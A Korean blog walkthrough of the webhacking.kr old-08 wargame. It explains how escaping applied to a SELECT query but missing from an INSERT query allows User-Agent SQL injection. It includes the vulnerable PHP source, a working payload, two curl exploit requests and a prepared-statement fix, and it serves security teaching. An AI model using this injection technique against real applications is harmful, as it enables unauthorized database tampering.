---
title: "webhacking.kr old-08 풀이 — SELECT는 막고 INSERT는 놓친 User-Agent 인젝션"
description: "webhacking.kr old-08을 풀며, 같은 User-Agent 헤더가 한쪽 쿼리에서는 addslashes로 escape되고 다른 쿼리에서는 그대로 들어가는 '이스케이프 비대칭'이 어떻게 INSERT 인젝션으로 이어지는지, 왜 두 번의 요청이 필요한지를 직접 확인한 결과로 정리한다."
date: 2026-11-05
category: Web
tags: [webhacking.kr, web, wargame, sql-injection, insert-injection, user-agent, php, mysql]
---

[webhacking.kr](https://webhacking.kr)의 **old-08** 문제를 풀었다.
이 문제는 **User-Agent 헤더**를 DB에 저장하는 평범한 로그 기능처럼 보이지만,
**같은 헤더가 두 개의 쿼리에서 서로 다르게 처리된다**는 점이 핵심이다.
조회(`SELECT`)에는 `addslashes`가 걸려 있어 안전하지만,
저장(`INSERT`)에는 **아무런 escape 없이** 그대로 들어간다.

"페이로드 한 줄"로 끝내지 않고, **쿼리가 실제로 어떻게 조립되는지**,
그리고 **왜 한 번이 아니라 두 번의 요청이 필요한지**까지 직접 요청을 보내 확인하며 정리한다.

## 1. 문제 개요

| 항목 | 값 |
| --- | --- |
| 사이트 | webhacking.kr (old) |
| 문제 | old-08 (`/challenge/web-08/`) |
| 유형 | SQL Injection (INSERT / User-Agent 헤더) |
| 배점 | 35 |
| 목표 | `agent` 테이블에서 `id`가 **`admin`** 인 행을 조회시켜 통과 |

문제 페이지를 열면 특별한 입력 폼은 없고, 접속만 해도 `done! (N/70)` 카운터가 올라간다.
페이지 하단의 `view-source` 링크(`?view_source=1`)로 **전체 소스가 공개**되어 있어,
추측 없이 로직을 그대로 읽고 검증할 수 있었다.

## 2. 소스 코드

`?view_source=1`로 직접 확인한 핵심 로직은 다음과 같다.

```php
<?php
$agent = trim(getenv("HTTP_USER_AGENT"));
$ip = $_SERVER['REMOTE_ADDR'];
if(preg_match("/from/i",$agent)){
  echo("<br>Access Denied!<br><br>");
  echo(htmlspecialchars($agent));
  exit();
}
$db = dbconnect();
$count_ck = mysqli_fetch_array(mysqli_query($db,"select count(id) from chall8"));
if($count_ck[0] >= 70){ mysqli_query($db,"delete from chall8"); }

// (A) 조회 — addslashes 로 escape 됨
$result = mysqli_query($db,"select id from chall8 where agent='".addslashes($_SERVER['HTTP_USER_AGENT'])."'");
$ck = mysqli_fetch_array($result);

if($ck){
  echo "hi <b>".htmlentities($ck[0])."</b><p>";
  if($ck[0]=="admin"){
    mysqli_query($db,"delete from chall8");
    solve(8);
  }
}

// (B) 저장 — $agent 를 그대로 삽입 (escape 없음)
if(!$ck){
  $q=mysqli_query($db,"insert into chall8(agent,ip,id) values('{$agent}','{$ip}','guest')") or die("query error");
  echo("<br><br>done!  ({$count_ck[0]}/70)");
}
?>
```

읽어보면 한 요청 안에서 벌어지는 일은 이렇다.

1. User-Agent에 `from`이 들어 있으면 차단한다(`preg_match("/from/i")`).
2. `chall8` 테이블의 행이 70개 이상이면 전체를 비운다 — **자가 초기화**.
3. **(A) 조회**: 내 User-Agent와 일치하는 행이 있으면 그 행의 `id`를 꺼내 `hi <id>`를 출력하고,
   그 `id`가 `admin`이면 `solve(8)`로 통과시킨다.
4. **(B) 저장**: 일치하는 행이 없을 때만, 내 User-Agent로 `id='guest'` 행을 하나 **새로 삽입**한다.

## 3. 취약점 — 같은 헤더, 다른 처리 (이스케이프 비대칭)

이 문제의 급소는 **같은 User-Agent 값이 두 쿼리에서 다르게 다뤄진다**는 데 있다.

```php
// (A) 조회: escape 됨 → 안전
"select id from chall8 where agent='".addslashes($_SERVER['HTTP_USER_AGENT'])."'"

// (B) 저장: $agent = trim(getenv("HTTP_USER_AGENT")) 를 그대로 사용 → 인젝션
"insert into chall8(agent,ip,id) values('{$agent}','{$ip}','guest')"
```

`addslashes`는 `'` `"` `\` `NUL`에 백슬래시를 붙여 **문자열을 깨지 못하게** 만든다.
그래서 **(A) 조회**는 따옴표를 아무리 넣어도 쿼리 구조가 바뀌지 않는다.

하지만 **(B) 저장**에서 쓰는 `$agent`는 `getenv("HTTP_USER_AGENT")`를
`trim`만 한 **원본 문자열**이다. `addslashes`를 거치지 않는다.
즉 **조회는 막혀 있지만 저장은 열려 있다.** User-Agent에 따옴표를 넣으면
`INSERT`의 `VALUES(...)` 구조를 그대로 비집고 들어갈 수 있다.

목표는 `id`가 `admin`인 행을 만드는 것이다. `INSERT` 템플릿은 다음과 같다.

```sql
insert into chall8(agent,ip,id) values('<User-Agent>','<IP>','guest')
```

세 번째 컬럼 `id`는 서버가 `'guest'`로 고정해 두었다. 이걸 `'admin'`으로 바꾸려면,
`<User-Agent>` 자리에서 문자열을 끊고 **내가 원하는 컬럼 값을 직접 채운 뒤 나머지를 주석 처리**하면 된다.

## 4. 페이로드와 PoC

User-Agent를 다음과 같이 보낸다. (`from` 필터에 걸리지 않도록 해당 문자열은 쓰지 않았다.)

```
User-Agent: zqx8','x','admin')-- -
```

이 값이 `$agent`로 **그대로** `INSERT`에 들어가면 쿼리는 이렇게 조립된다.

```sql
insert into chall8(agent,ip,id) values('zqx8','x','admin')-- -','<IP>','guest')
```

`-- -`(공백 포함) 뒤가 전부 주석 처리되어, 실제로 실행되는 삽입은 다음과 같다.

| 컬럼 | 값 |
| --- | --- |
| `agent` | `zqx8` |
| `ip` | `x` |
| `id` | **`admin`** |

즉 **`agent`가 `zqx8`이고 `id`가 `admin`인 행**이 하나 생긴다.

### 왜 요청이 두 번 필요한가

한 번으로 끝나지 않는 이유는 **한 요청 안에서 (A) 조회가 (B) 저장보다 먼저** 실행되기 때문이다.

- **1차 요청**: (A) 조회는 `addslashes` 때문에 내 긴 페이로드 문자열과 일치하는 행을 찾지 못한다
  (`$ck`가 비어 있음) → 그래서 (B) 저장으로 넘어가 **`id='admin'` 행이 삽입**된다.
  아직 조회에 걸린 게 없으니 이 요청 자체로는 통과되지 않는다.
- **2차 요청**: User-Agent를 **삽입된 행의 `agent` 값인 `zqx8`** 로 바꿔 보낸다.
  이제 (A) 조회 `where agent='zqx8'`가 1차에서 심어 둔 행과 **정확히 일치**하고,
  그 행의 `id`가 `admin`이라 `solve(8)`이 호출된다.

따옴표 없는 짧은 토큰(`zqx8`)을 `agent`로 심어 둔 것이 핵심이다 —
2차 요청의 User-Agent는 `addslashes`를 거쳐도 변형되지 않아 저장된 행과 그대로 매칭된다.

## 5. 익스플로잇 — 직접 확인

로그인 세션(`PHPSESSID`)을 유지한 채 `curl`로 두 번 요청을 보냈다.

```console
# 1차 — INSERT 인젝션으로 admin 행 삽입
$ curl -s -b "PHPSESSID=..." -A "zqx8','x','admin')-- -" \
    https://webhacking.kr/challenge/web-08/index.php
...
<br><br>done!  (12/70)

# 2차 — agent=zqx8 로 조회를 일치시켜 통과
$ curl -s -b "PHPSESSID=..." -A "zqx8" \
    https://webhacking.kr/challenge/web-08/index.php
...
hi <b>admin</b><p>
<script>alert('old-08 Pwned!');</script>
<hr>old-08 Pwned. You got 35point. Congratz!<hr>
```

2차 요청에서 `hi admin`과 함께 **`old-08 Pwned. You got 35point. Congratz!`** 가 출력되며 통과했다.
문제 목록(`chall.php`)에서도 old-08이 **풀린 상태(✔)** 로 바뀌고 풀이 수가 1 증가한 것을 확인했다.

> 이 문제는 따로 제출할 플래그 문자열이 없다. **`id='admin'` 행이 조회되는 순간**
> 서버가 `solve(8)`을 호출해 **그 상태 자체로 바로 통과** 처리된다.
> 통과 직후 서버는 `delete from chall8`로 테이블을 비운다.

## 6. 왜 취약한가 — 그리고 올바른 방어

본질은 **"입력을 어디서는 escape하고 어디서는 안 한다"** 는 일관성 없는 처리다.
개발자는 조회 쿼리에만 `addslashes`를 신경 썼지만, **같은 사용자 입력(User-Agent)** 이
저장 쿼리에서는 아무 보호 없이 쿼리 문자열에 섞여 들어갔다.
공격자는 두 경로 중 **방어가 빠진 쪽**만 고르면 된다.

제대로 된 방어는 두 쿼리 **모두** 입력을 문자열에 섞지 않는 것 — **파라미터 바인딩(prepared statement)** 이다.

```php
// 조회
$stmt = $db->prepare("select id from chall8 where agent=?");
$stmt->bind_param("s", $_SERVER['HTTP_USER_AGENT']);
$stmt->execute();

// 저장
$stmt = $db->prepare("insert into chall8(agent,ip,id) values(?,?,?)");
$stmt->bind_param("sss", $agent, $ip, $guest);  // $guest = 'guest'
$stmt->execute();
```

이렇게 하면 User-Agent는 **데이터로만** 취급되어 `'`나 `)` 같은 문자가 쿼리 구조를 바꾸지 못한다.
`addslashes`에 의존하는 방식은 **한 군데라도 빠지면** 그대로 뚫린다 —
이 문제가 정확히 그 사례다.

## 7. 정리

- **User-Agent 같은 HTTP 헤더도 사용자 입력**이다. 폼 필드만 검증하고 헤더를 흘려보내면 인젝션 지점이 된다.
- 핵심은 **이스케이프 비대칭** — 같은 입력이 조회에서는 `addslashes`로 막히지만 저장에서는 그대로 들어간다.
- `INSERT` 인젝션은 `VALUES(...)`를 끊고 **원하는 컬럼 값(`id='admin'`)을 직접 채운 뒤 주석(`-- -`)으로 나머지를 날리는** 방식으로 성립한다.
- 조회가 저장보다 먼저 실행되므로, **① 심고(INSERT) ② 다시 조회(SELECT)** 하는 **2단계 요청**이 필요하다.
- 올바른 해법은 **모든 쿼리에 prepared statement**. 방어는 일부가 아니라 전부에 일관되게 적용돼야 한다.

> 블랙리스트나 escape를 한 겹 더 쌓기 전에, "같은 입력이 지나가는 **모든 경로**가 똑같이 보호되는가"를 먼저 묻는다.
